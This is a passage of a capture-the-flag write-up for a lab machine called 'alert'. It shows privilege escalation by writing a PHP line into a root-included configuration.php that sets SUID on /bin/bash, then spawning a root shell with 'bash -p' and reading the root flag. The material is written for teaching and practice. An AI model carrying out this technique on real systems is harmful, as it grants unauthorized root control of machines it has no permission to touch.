+The `index.php` is executed as root and it includes `configuration.php` file inside the `config` folder. We have privileges to read, write, and execute files inside the `config` folder so we can try to add our malicious php code inside the `configuration.php` file.
+
+```
+albert@alert:/opt/website-monitor/config$ echo "<?php shell_exec('sudo chmod -R 7777 /bin/bash') ?>" > configuration.php
+albert@alert:/opt/website-monitor/config$ cat configuration.php
+<?php shell_exec('sudo chmod -R 7777 /bin/bash') ?>
+```
+
+We will now need to wait a bit and hopefully the permission of `/bin/bash` file is changed so we can elevate our privileges to root.
+
+```
+albert@alert:/opt/website-monitor/config$ ls -la /bin/bash
+-rwsrwsrwt 1 root root 1183448 Apr 18  2022 /bin/bash
+albert@alert:/opt/website-monitor/config$ /bin/bash -p
+bash-5.0# whoami
+root
+bash-5.0# hostname
+alert
+bash-5.0# pwd
+/opt/website-monitor/config
+bash-5.0# cat /root/root.txt
+0027b072067eaa5e31794e08a2f8c1c5
+bash-5.0#
+```
+
+Success! We successfully managed to elevate our privileges on the machine and read the root.txt flag.
